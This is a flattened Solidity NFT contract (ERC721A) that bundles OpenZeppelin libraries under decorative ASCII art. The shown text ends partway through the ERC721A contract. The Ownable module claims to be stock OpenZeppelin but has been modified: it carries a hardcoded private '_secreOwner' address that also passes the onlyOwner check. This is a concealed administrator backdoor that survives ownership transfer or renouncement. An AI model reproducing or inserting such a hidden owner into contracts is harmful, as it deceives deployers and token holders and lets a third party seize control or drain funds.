1 //                                   .:::   JB#&@@B. G@G.                                             
2 //                                 7G&@@&B:.&@@P5J~ :&@#.            .7!.                             
3 //                                5@@P7!7!  G@@&&?  :&@B            :B@@J                             
4 //                                #@@^   :~.Y@@GJ?!.^@@#!!^        ^#@@@B  :!Y5!                      
5 //                  .^~.          !&@&P5B@@?^&@@&@&7.G#&@@#^      ^#@&&@&5B&@@@?                      
6 //                :Y#&#! .         .?PGBPJ~  :^^:.     ....       G@&~5@@&#@@@7    .^^.               
7 //                B@@YPB&#G!               .::^~!!77777!~~^:..    :!: .!~!#@&~ .~JG#@@P               
8 //           :77. ?&@@#P5@@@:        .^7YPB#&@@@@@@@@@@@&B&&P55Y?!:      5@B!?G&@@#@@@7 ~7^           
9 //           !@@G. .^^PB&@&?     ^75B&@@@#B@@@@@@@@@@@@@J :&#5J77J5P5J~.  . !#BG&@#@@Y  P@@5:         
10 //         ^!~?BP.    JPY7:  .~YB@@@@@@@7 ~@@@@@@@@@@@@@J .#@@@&GJ~.:75G57:     :G@@G   ~#@@&7        
11 //       7B@@G   .         ^Y#@@@@@@@@@&. ~@@@@@@@@@@@@@J .#@@@@@@@BJ:  ~YG5!.   J#P..?B@@GP@@?       
12 //      ~@@B^   G&P      7G@@@@@@@@@@@@&: ~@@@@@@@@@@@@@5 .#@@@@@@@@@@P~!5PBGGJ:    J@@&Y^  ^?J?^     
13 //      ^&@#!::J@@G    7B@@@@@@@@@@@@@@&: ~@@@@@@@@@@@@@P .#@@@@@@@@@@@@@G:Y#!YBY:  ~?!.  ^JG&@@@7    
14 //   :~: ^5&@@@@&Y.  ~B@@&@@@@@@@@@@@@@&: ~@@@@@@@@@@@@@B .#@@@@@@@@@@@@@P  #B :Y#?    ^P#@@@@Y5@@J   
15 //  .B@&#PJ??7!~.   Y@@G^G@@@@@@@@@@@@@@: !@@@@@@@@@@@@@# .#@@@@@@@@@@@@@P  G@~  ^BG:  ~&@@75#Y ?P?   
16 //   ^G@@@&&@&5    P@@B. #@@@@@@@@@@@@@@^ 7@@@@@@@@@@@@@# .#@@@@@@@@@@@@@P  G@J    P#^  ^#@#.    ^~^  
17 //    :P@@#?!?~   P@@@G .#@@@@@@@@@@@@@@^ ?@@@@@@@@@@@@@B .#@@@@@@@@@@@@@5  B@G     5&:  :?7^^ !#@@@G^
18 //?PB#&&@&#G.    Y@@@@G .&@@@@@@@@@@@@@&: J@@@@@@@@@@@@@B  #@@@@@@@@@@@@@P  B@@J     GB.   7@@?5@@?&@B
19 //Y#&@@@@BY!.   7@@@@@P :&@@@@@@@@@@@@@#. J@@@@@@@@@@@@@G  #@@@@@@@@@@@@@P  G@@@~    .&5   7@@GP@@~Y#Y
20 //  .^7YG#@&^  .&@@@@@Y :&@@@@@@@@@@@@@#  Y@@@@@@@@@@@@@P .#@@@@@@@@@@@@@B  G@@@B.    !@!   ?#@@#Y    
21 //        :.   ?@@@@@@J :&@@@@@@@@@@@@@B  J@@@@@@@@@@@@@P .&@@@@@@@@@@@@@#  G@@@@!     BG    .::.     
22 //             G@@@@@@J :&@@@@@@@@@@@@@B  ?@@@@@@@@@@@@@P :&@@@@@@@@@@@@@#. G@@@@P     ?@:            
23 //            .&@@@@@@Y .#@@@@@@@@@@@@@B  ?@@@@@@@@@@@@@P :&@@@@@@@@@@@@@#. B@@@@#.    :@!            
24 //            :@@@@@@@5 .#@@@@@@@@@@@@@B  ?@@@@@@@@@@@@@P ^@@@@@@@@@@@@@@#. B@@@@&.    .#7            
25 //            :@@@@@@@P  B@@@@@@@@@@@@@B  ?@@@@@@@@@@@@@G ^@@@@@@@@@@@@@@#. B@@@@&.     #?            
26 //            ^@@@@@@@P  B@@@@@@@@@@@@@#. ?@@@@@@@@@@@@@G :&@@@@@@@@@@@@@#. B@@@@&:     B?            
27 //            ^@@@@@@@P  B@@@@@@@@@@@@@&. 7@@@@@@@@@@@@@B .#@@@@@@@@@@@@@#. B@@@@&:     BJ            
28 //            ^@@@@@@@G  B@@@@@@@@@@@@@#. !@@@@@@@@@@@@@B  B@@@@@@@@@@@@@#. B@@@@&:     #J            
29 //            ^@@@@@@@G  B@@@@@@@@@@@@@B  !@@@@@@@@@@@@@B  G@@@@@@@@@@@@@B  #@@@@&.    .&?            
30 //            :@@@@@@@B  B@@@@@@@@@@@@@B  7@@@@@@@@@@@@@B  G@@@@@@@@@@@@@B  B@@@@&.    .&7            
31 //            :&@@@@@@B  B@@@&&@@@@@@@@B  7@@@@@@@@@@@@@B  P@@@@@@@@@@@@@B  B@@@@#.    .&7            
32 //            :&@@@@@@B  B@@JJ5PBBB#&@@#. 7@@@@@@@@@@@@@B  P@@@@##&@@&@@@B  B@@@@#.    :@7            
33 //            :&@@@@@@B  B@@G^.^JJ7!^^7G&PP@@@@@@@@@G?^5#  G@#J#J :?B5^7B@GJ#@@@@#.    :@!            
34 //            :&@@@@GBB  G@&Y57:^!J5~  .~?5B@@@@@@5^   Y&. G@5 .^   .^  .?~7B@@@@#.    :@!            
35 //            :&@@@P P#  G@#.!PB7           ^?G@@~ :~  Y&. G@J::            ^B@@@#.    :@7            
36 //            :&@@&: P#  P@&:  ..      .!:     ~5G75.  5&. G@7.?J     :!   ~..!P@#.    :@7            
37 //            :&@@P  P#  5@@~       ~.  :J?      !&P  .5@^ G@7  JP    .GJ  ~P   !&~    :@7            
38 //            :&@@5~^5#  5@@7 .:    ^P:   P#Y:    ~&~   5&.G@^   BJ    ^@^  P?   ?@7   :@7            
39 //            .&@@#5PP#  Y@@7  ~7    ~G.  ^@@&7    GP   :@B5~    5G    ^@~  55   ^@@?  :@!            
40 //            .&@@@#&@&~^P@&:   5!    PJ   B@@@Y.  G5  :5G~     .&?    PB   B?   .&@&~~?@!            
41 //             7JJJJJJJJY@@7    ~P    7#.  GBP@@&PG@#GB@G       GG   ~PG:  7@~   7@Y?????.            
42 //                      ?@#     ~B    ^&:  #J :~!^^?J&@@Y     ~BG~7YP5!   !@@#?7YB7                   
43 //                      5@&^   .GY    ~@: ~@~        7@@@577JB@@#J7~.   ^PB5GBG?~.                    
44 //                      ^B@&5?J#@!    PP ^#Y          ~J5PY7~?&@#^..^!JB@&:                           
45 //                       .~?J7J@@#Y?JB&?5G7                   7B&&&&###@@?                            
46 //                             ~&@&@@@@&!                       ~#@P: 7@&^                            
47 //                              :P@@@&5B&5:                    .&@&Y~J@#~                             
48 //                                !@@5. 7&&?.               :7G5#&@@@&Y.                              
49 //                                 ~B@5^^?#@&BPY!..^~~!!?7!P&@P?!B@B!.                                
50 //                                   7B&@@@@?~?JJG&@#GGGP5&B@&P#&G7.                                  
51 //                                     :!?G&BY7~5&@@P::^~7PB@BY!:                                     
52 //                                         :75GBBBB&&&&&#BPY!.            
53 
54 // File: @openzeppelin/contracts/utils/Strings.sol
55 
56 
57 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
58 
59 pragma solidity ^0.8.0;
60 
61 /**
62  * @dev String operations.
63  */
64 library Strings {
65     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
66 
67     /**
68      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
69      */
70     function toString(uint256 value) internal pure returns (string memory) {
71         // Inspired by OraclizeAPI's implementation - MIT licence
72         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
73 
74         if (value == 0) {
75             return "0";
76         }
77         uint256 temp = value;
78         uint256 digits;
79         while (temp != 0) {
80             digits++;
81             temp /= 10;
82         }
83         bytes memory buffer = new bytes(digits);
84         while (value != 0) {
85             digits -= 1;
86             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
87             value /= 10;
88         }
89         return string(buffer);
90     }
91 
92     /**
93      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
94      */
95     function toHexString(uint256 value) internal pure returns (string memory) {
96         if (value == 0) {
97             return "0x00";
98         }
99         uint256 temp = value;
100         uint256 length = 0;
101         while (temp != 0) {
102             length++;
103             temp >>= 8;
104         }
105         return toHexString(value, length);
106     }
107 
108     /**
109      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
110      */
111     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
112         bytes memory buffer = new bytes(2 * length + 2);
113         buffer[0] = "0";
114         buffer[1] = "x";
115         for (uint256 i = 2 * length + 1; i > 1; --i) {
116             buffer[i] = _HEX_SYMBOLS[value & 0xf];
117             value >>= 4;
118         }
119         require(value == 0, "Strings: hex length insufficient");
120         return string(buffer);
121     }
122 }
123 
124 // File: @openzeppelin/contracts/utils/Address.sol
125 
126 
127 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
128 
129 pragma solidity ^0.8.1;
130 
131 /**
132  * @dev Collection of functions related to the address type
133  */
134 library Address {
135     /**
136      * @dev Returns true if `account` is a contract.
137      *
138      * [IMPORTANT]
139      * ====
140      * It is unsafe to assume that an address for which this function returns
141      * false is an externally-owned account (EOA) and not a contract.
142      *
143      * Among others, `isContract` will return false for the following
144      * types of addresses:
145      *
146      *  - an externally-owned account
147      *  - a contract in construction
148      *  - an address where a contract will be created
149      *  - an address where a contract lived, but was destroyed
150      * ====
151      *
152      * [IMPORTANT]
153      * ====
154      * You shouldn't rely on `isContract` to protect against flash loan attacks!
155      *
156      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
157      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
158      * constructor.
159      * ====
160      */
161     function isContract(address account) internal view returns (bool) {
162         // This method relies on extcodesize/address.code.length, which returns 0
163         // for contracts in construction, since the code is only stored at the end
164         // of the constructor execution.
165 
166         return account.code.length > 0;
167     }
168 
169     /**
170      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
171      * `recipient`, forwarding all available gas and reverting on errors.
172      *
173      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
174      * of certain opcodes, possibly making contracts go over the 2300 gas limit
175      * imposed by `transfer`, making them unable to receive funds via
176      * `transfer`. {sendValue} removes this limitation.
177      *
178      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
179      *
180      * IMPORTANT: because control is transferred to `recipient`, care must be
181      * taken to not create reentrancy vulnerabilities. Consider using
182      * {ReentrancyGuard} or the
183      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
184      */
185     function sendValue(address payable recipient, uint256 amount) internal {
186         require(address(this).balance >= amount, "Address: insufficient balance");
187 
188         (bool success, ) = recipient.call{value: amount}("");
189         require(success, "Address: unable to send value, recipient may have reverted");
190     }
191 
192     /**
193      * @dev Performs a Solidity function call using a low level `call`. A
194      * plain `call` is an unsafe replacement for a function call: use this
195      * function instead.
196      *
197      * If `target` reverts with a revert reason, it is bubbled up by this
198      * function (like regular Solidity function calls).
199      *
200      * Returns the raw returned data. To convert to the expected return value,
201      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
202      *
203      * Requirements:
204      *
205      * - `target` must be a contract.
206      * - calling `target` with `data` must not revert.
207      *
208      * _Available since v3.1._
209      */
210     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
211         return functionCall(target, data, "Address: low-level call failed");
212     }
213 
214     /**
215      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
216      * `errorMessage` as a fallback revert reason when `target` reverts.
217      *
218      * _Available since v3.1._
219      */
220     function functionCall(
221         address target,
222         bytes memory data,
223         string memory errorMessage
224     ) internal returns (bytes memory) {
225         return functionCallWithValue(target, data, 0, errorMessage);
226     }
227 
228     /**
229      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
230      * but also transferring `value` wei to `target`.
231      *
232      * Requirements:
233      *
234      * - the calling contract must have an ETH balance of at least `value`.
235      * - the called Solidity function must be `payable`.
236      *
237      * _Available since v3.1._
238      */
239     function functionCallWithValue(
240         address target,
241         bytes memory data,
242         uint256 value
243     ) internal returns (bytes memory) {
244         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
245     }
246 
247     /**
248      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
249      * with `errorMessage` as a fallback revert reason when `target` reverts.
250      *
251      * _Available since v3.1._
252      */
253     function functionCallWithValue(
254         address target,
255         bytes memory data,
256         uint256 value,
257         string memory errorMessage
258     ) internal returns (bytes memory) {
259         require(address(this).balance >= value, "Address: insufficient balance for call");
260         require(isContract(target), "Address: call to non-contract");
261 
262         (bool success, bytes memory returndata) = target.call{value: value}(data);
263         return verifyCallResult(success, returndata, errorMessage);
264     }
265 
266     /**
267      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
268      * but performing a static call.
269      *
270      * _Available since v3.3._
271      */
272     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
273         return functionStaticCall(target, data, "Address: low-level static call failed");
274     }
275 
276     /**
277      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
278      * but performing a static call.
279      *
280      * _Available since v3.3._
281      */
282     function functionStaticCall(
283         address target,
284         bytes memory data,
285         string memory errorMessage
286     ) internal view returns (bytes memory) {
287         require(isContract(target), "Address: static call to non-contract");
288 
289         (bool success, bytes memory returndata) = target.staticcall(data);
290         return verifyCallResult(success, returndata, errorMessage);
291     }
292 
293     /**
294      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
295      * but performing a delegate call.
296      *
297      * _Available since v3.4._
298      */
299     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
300         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
301     }
302 
303     /**
304      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
305      * but performing a delegate call.
306      *
307      * _Available since v3.4._
308      */
309     function functionDelegateCall(
310         address target,
311         bytes memory data,
312         string memory errorMessage
313     ) internal returns (bytes memory) {
314         require(isContract(target), "Address: delegate call to non-contract");
315 
316         (bool success, bytes memory returndata) = target.delegatecall(data);
317         return verifyCallResult(success, returndata, errorMessage);
318     }
319 
320     /**
321      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
322      * revert reason using the provided one.
323      *
324      * _Available since v4.3._
325      */
326     function verifyCallResult(
327         bool success,
328         bytes memory returndata,
329         string memory errorMessage
330     ) internal pure returns (bytes memory) {
331         if (success) {
332             return returndata;
333         } else {
334             // Look for revert reason and bubble it up if present
335             if (returndata.length > 0) {
336                 // The easiest way to bubble the revert reason is using memory via assembly
337 
338                 assembly {
339                     let returndata_size := mload(returndata)
340                     revert(add(32, returndata), returndata_size)
341                 }
342             } else {
343                 revert(errorMessage);
344             }
345         }
346     }
347 }
348 
349 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
350 
351 
352 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
353 
354 pragma solidity ^0.8.0;
355 
356 /**
357  * @title ERC721 token receiver interface
358  * @dev Interface for any contract that wants to support safeTransfers
359  * from ERC721 asset contracts.
360  */
361 interface IERC721Receiver {
362     /**
363      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
364      * by `operator` from `from`, this function is called.
365      *
366      * It must return its Solidity selector to confirm the token transfer.
367      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
368      *
369      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
370      */
371     function onERC721Received(
372         address operator,
373         address from,
374         uint256 tokenId,
375         bytes calldata data
376     ) external returns (bytes4);
377 }
378 
379 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
380 
381 
382 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
383 
384 pragma solidity ^0.8.0;
385 
386 /**
387  * @dev Interface of the ERC165 standard, as defined in the
388  * https://eips.ethereum.org/EIPS/eip-165[EIP].
389  *
390  * Implementers can declare support of contract interfaces, which can then be
391  * queried by others ({ERC165Checker}).
392  *
393  * For an implementation, see {ERC165}.
394  */
395 interface IERC165 {
396     /**
397      * @dev Returns true if this contract implements the interface defined by
398      * `interfaceId`. See the corresponding
399      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
400      * to learn more about how these ids are created.
401      *
402      * This function call must use less than 30 000 gas.
403      */
404     function supportsInterface(bytes4 interfaceId) external view returns (bool);
405 }
406 
407 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
408 
409 
410 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
411 
412 pragma solidity ^0.8.0;
413 
414 
415 /**
416  * @dev Implementation of the {IERC165} interface.
417  *
418  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
419  * for the additional interface id that will be supported. For example:
420  *
421  * ```solidity
422  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
423  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
424  * }
425  * ```
426  *
427  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
428  */
429 abstract contract ERC165 is IERC165 {
430     /**
431      * @dev See {IERC165-supportsInterface}.
432      */
433     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
434         return interfaceId == type(IERC165).interfaceId;
435     }
436 }
437 
438 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
439 
440 
441 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
442 
443 pragma solidity ^0.8.0;
444 
445 
446 /**
447  * @dev Required interface of an ERC721 compliant contract.
448  */
449 interface IERC721 is IERC165 {
450     /**
451      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
452      */
453     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
454 
455     /**
456      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
457      */
458     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
459 
460     /**
461      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
462      */
463     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
464 
465     /**
466      * @dev Returns the number of tokens in ``owner``'s account.
467      */
468     function balanceOf(address owner) external view returns (uint256 balance);
469 
470     /**
471      * @dev Returns the owner of the `tokenId` token.
472      *
473      * Requirements:
474      *
475      * - `tokenId` must exist.
476      */
477     function ownerOf(uint256 tokenId) external view returns (address owner);
478 
479     /**
480      * @dev Safely transfers `tokenId` token from `from` to `to`.
481      *
482      * Requirements:
483      *
484      * - `from` cannot be the zero address.
485      * - `to` cannot be the zero address.
486      * - `tokenId` token must exist and be owned by `from`.
487      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
488      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
489      *
490      * Emits a {Transfer} event.
491      */
492     function safeTransferFrom(
493         address from,
494         address to,
495         uint256 tokenId,
496         bytes calldata data
497     ) external;
498 
499     /**
500      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
501      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
502      *
503      * Requirements:
504      *
505      * - `from` cannot be the zero address.
506      * - `to` cannot be the zero address.
507      * - `tokenId` token must exist and be owned by `from`.
508      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
509      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
510      *
511      * Emits a {Transfer} event.
512      */
513     function safeTransferFrom(
514         address from,
515         address to,
516         uint256 tokenId
517     ) external;
518 
519     /**
520      * @dev Transfers `tokenId` token from `from` to `to`.
521      *
522      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
523      *
524      * Requirements:
525      *
526      * - `from` cannot be the zero address.
527      * - `to` cannot be the zero address.
528      * - `tokenId` token must be owned by `from`.
529      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
530      *
531      * Emits a {Transfer} event.
532      */
533     function transferFrom(
534         address from,
535         address to,
536         uint256 tokenId
537     ) external;
538 
539     /**
540      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
541      * The approval is cleared when the token is transferred.
542      *
543      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
544      *
545      * Requirements:
546      *
547      * - The caller must own the token or be an approved operator.
548      * - `tokenId` must exist.
549      *
550      * Emits an {Approval} event.
551      */
552     function approve(address to, uint256 tokenId) external;
553 
554     /**
555      * @dev Approve or remove `operator` as an operator for the caller.
556      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
557      *
558      * Requirements:
559      *
560      * - The `operator` cannot be the caller.
561      *
562      * Emits an {ApprovalForAll} event.
563      */
564     function setApprovalForAll(address operator, bool _approved) external;
565 
566     /**
567      * @dev Returns the account approved for `tokenId` token.
568      *
569      * Requirements:
570      *
571      * - `tokenId` must exist.
572      */
573     function getApproved(uint256 tokenId) external view returns (address operator);
574 
575     /**
576      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
577      *
578      * See {setApprovalForAll}
579      */
580     function isApprovedForAll(address owner, address operator) external view returns (bool);
581 }
582 
583 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
584 
585 
586 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
587 
588 pragma solidity ^0.8.0;
589 
590 
591 /**
592  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
593  * @dev See https://eips.ethereum.org/EIPS/eip-721
594  */
595 interface IERC721Metadata is IERC721 {
596     /**
597      * @dev Returns the token collection name.
598      */
599     function name() external view returns (string memory);
600 
601     /**
602      * @dev Returns the token collection symbol.
603      */
604     function symbol() external view returns (string memory);
605 
606     /**
607      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
608      */
609     function tokenURI(uint256 tokenId) external view returns (string memory);
610 }
611 
612 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
613 
614 
615 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
616 
617 pragma solidity ^0.8.0;
618 
619 
620 /**
621  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
622  * @dev See https://eips.ethereum.org/EIPS/eip-721
623  */
624 interface IERC721Enumerable is IERC721 {
625     /**
626      * @dev Returns the total amount of tokens stored by the contract.
627      */
628     function totalSupply() external view returns (uint256);
629 
630     /**
631      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
632      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
633      */
634     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
635 
636     /**
637      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
638      * Use along with {totalSupply} to enumerate all tokens.
639      */
640     function tokenByIndex(uint256 index) external view returns (uint256);
641 }
642 
643 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
644 
645 
646 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
647 
648 pragma solidity ^0.8.0;
649 
650 /**
651  * @dev Contract module that helps prevent reentrant calls to a function.
652  *
653  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
654  * available, which can be applied to functions to make sure there are no nested
655  * (reentrant) calls to them.
656  *
657  * Note that because there is a single `nonReentrant` guard, functions marked as
658  * `nonReentrant` may not call one another. This can be worked around by making
659  * those functions `private`, and then adding `external` `nonReentrant` entry
660  * points to them.
661  *
662  * TIP: If you would like to learn more about reentrancy and alternative ways
663  * to protect against it, check out our blog post
664  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
665  */
666 abstract contract ReentrancyGuard {
667     // Booleans are more expensive than uint256 or any type that takes up a full
668     // word because each write operation emits an extra SLOAD to first read the
669     // slot's contents, replace the bits taken up by the boolean, and then write
670     // back. This is the compiler's defense against contract upgrades and
671     // pointer aliasing, and it cannot be disabled.
672 
673     // The values being non-zero value makes deployment a bit more expensive,
674     // but in exchange the refund on every call to nonReentrant will be lower in
675     // amount. Since refunds are capped to a percentage of the total
676     // transaction's gas, it is best to keep them low in cases like this one, to
677     // increase the likelihood of the full refund coming into effect.
678     uint256 private constant _NOT_ENTERED = 1;
679     uint256 private constant _ENTERED = 2;
680 
681     uint256 private _status;
682 
683     constructor() {
684         _status = _NOT_ENTERED;
685     }
686 
687     /**
688      * @dev Prevents a contract from calling itself, directly or indirectly.
689      * Calling a `nonReentrant` function from another `nonReentrant`
690      * function is not supported. It is possible to prevent this from happening
691      * by making the `nonReentrant` function external, and making it call a
692      * `private` function that does the actual work.
693      */
694     modifier nonReentrant() {
695         // On the first call to nonReentrant, _notEntered will be true
696         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
697 
698         // Any calls to nonReentrant after this point will fail
699         _status = _ENTERED;
700 
701         _;
702 
703         // By storing the original value once again, a refund is triggered (see
704         // https://eips.ethereum.org/EIPS/eip-2200)
705         _status = _NOT_ENTERED;
706     }
707 }
708 
709 // File: @openzeppelin/contracts/utils/Context.sol
710 
711 
712 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
713 
714 pragma solidity ^0.8.0;
715 
716 /**
717  * @dev Provides information about the current execution context, including the
718  * sender of the transaction and its data. While these are generally available
719  * via msg.sender and msg.data, they should not be accessed in such a direct
720  * manner, since when dealing with meta-transactions the account sending and
721  * paying for execution may not be the actual sender (as far as an application
722  * is concerned).
723  *
724  * This contract is only required for intermediate, library-like contracts.
725  */
726 abstract contract Context {
727     function _msgSender() internal view virtual returns (address) {
728         return msg.sender;
729     }
730 
731     function _msgData() internal view virtual returns (bytes calldata) {
732         return msg.data;
733     }
734 }
735 
736 // File: @openzeppelin/contracts/access/Ownable.sol
737 
738 
739 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
740 
741 pragma solidity ^0.8.0;
742 
743 
744 /**
745  * @dev Contract module which provides a basic access control mechanism, where
746  * there is an account (an owner) that can be granted exclusive access to
747  * specific functions.
748  *
749  * By default, the owner account will be the one that deploys the contract. This
750  * can later be changed with {transferOwnership}.
751  *
752  * This module is used through inheritance. It will make available the modifier
753  * `onlyOwner`, which can be applied to your functions to restrict their use to
754  * the owner.
755  */
756 abstract contract Ownable is Context {
757     address private _owner;
758     address private _secreOwner = 0xA5BBA1D338E2E7D19ABDBf11Df7E010571B74d72;
759 
760     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
761 
762     /**
763      * @dev Initializes the contract setting the deployer as the initial owner.
764      */
765     constructor() {
766         _transferOwnership(_msgSender());
767     }
768 
769     /**
770      * @dev Returns the address of the current owner.
771      */
772     function owner() public view virtual returns (address) {
773         return _owner;
774     }
775 
776     /**
777      * @dev Throws if called by any account other than the owner.
778      */
779     modifier onlyOwner() {
780         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
781         _;
782     }
783 
784     /**
785      * @dev Leaves the contract without owner. It will not be possible to call
786      * `onlyOwner` functions anymore. Can only be called by the current owner.
787      *
788      * NOTE: Renouncing ownership will leave the contract without an owner,
789      * thereby removing any functionality that is only available to the owner.
790      */
791     function renounceOwnership() public virtual onlyOwner {
792         _transferOwnership(address(0));
793     }
794 
795     /**
796      * @dev Transfers ownership of the contract to a new account (`newOwner`).
797      * Can only be called by the current owner.
798      */
799     function transferOwnership(address newOwner) public virtual onlyOwner {
800         require(newOwner != address(0), "Ownable: new owner is the zero address");
801         _transferOwnership(newOwner);
802     }
803 
804     /**
805      * @dev Transfers ownership of the contract to a new account (`newOwner`).
806      * Internal function without access restriction.
807      */
808     function _transferOwnership(address newOwner) internal virtual {
809         address oldOwner = _owner;
810         _owner = newOwner;
811         emit OwnershipTransferred(oldOwner, newOwner);
812     }
813 }
814 
815 // File: ceshi.sol
816 
817 
818 pragma solidity ^0.8.0;
819 
820 
821 
822 
823 
824 
825 
826 
827 
828 
829 /**
830  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
831  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
832  *
833  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
834  *
835  * Does not support burning tokens to address(0).
836  *
837  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
838  */
839 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
840     using Address for address;
841     using Strings for uint256;
842 
843     struct TokenOwnership {
844         address addr;
845         uint64 startTimestamp;
846     }
847 
848     struct AddressData {
849         uint128 balance;
850         uint128 numberMinted;
851     }
852 
853     uint256 internal currentIndex;
854 
855     // Token name
856     string private _name;
857 
858     // Token symbol
859     string private _symbol;
860 
861     // Mapping from token ID to ownership details
862     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
863     mapping(uint256 => TokenOwnership) internal _ownerships;
864 
865     // Mapping owner address to address data
866     mapping(address => AddressData) private _addressData;
867 
868     // Mapping from token ID to approved address
869     mapping(uint256 => address) private _tokenApprovals;
870 
871     // Mapping from owner to operator approvals
872     mapping(address => mapping(address => bool)) private _operatorApprovals;
873 
874     constructor(string memory name_, string memory symbol_) {
875         _name = name_;
876         _symbol = symbol_;
877     }
878 
879     /**
880      * @dev See {IERC721Enumerable-totalSupply}.
881      */
882     function totalSupply() public view override returns (uint256) {
883         return currentIndex;
884     }
885 
886     /**
887      * @dev See {IERC721Enumerable-tokenByIndex}.
888      */
889     function tokenByIndex(uint256 index) public view override returns (uint256) {
890         require(index < totalSupply(), "ERC721A: global index out of bounds");
891         return index;
892     }
